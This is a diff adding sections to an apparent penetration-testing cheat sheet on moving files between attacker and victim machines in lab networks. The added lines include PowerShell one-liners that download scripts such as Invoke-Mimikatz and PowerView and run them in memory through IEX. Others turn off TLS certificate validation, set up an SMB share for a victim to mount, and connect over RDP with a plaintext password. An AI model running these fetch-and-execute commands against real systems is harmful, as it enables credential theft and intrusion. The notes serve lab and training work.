@@ -23,15 +23,57 @@ wget -r -np http://10.10.14.98
 certutil.exe -urlcache -f http://10.10.16.3:9999/winPEASany.exe winPEASany.exe
 ```
 
+### Powershell download
+```
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+```
 Following code will execute in memory
 ```
 IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
 ```
 
+### Bypass common errors
+Parsing error
+```
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+
+SSL/TLS secure channel
+```
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+
 ### ssh/scp
 <img width="290" alt="Pasted image 20220807171219" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/a3a24e55-87f1-4bee-aa11-ad9678dd4ed5">
 
 
+### smb with username + pass
+attack
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+victim
+```
+net use n: \\192.168.220.133\share /user:test test
+```
+### Mount linux folder with rdp
+```
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+### Using nc
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/94b2098c-8733-4757-a4bf-aa8be6ffc7a8)
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/07c2968c-dba2-4728-bbe9-61a07ceadd97)
+
+
+## Windows hash
+To ensure integrity
+```
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
 ## From Windows to Attack
 
 ### ftp
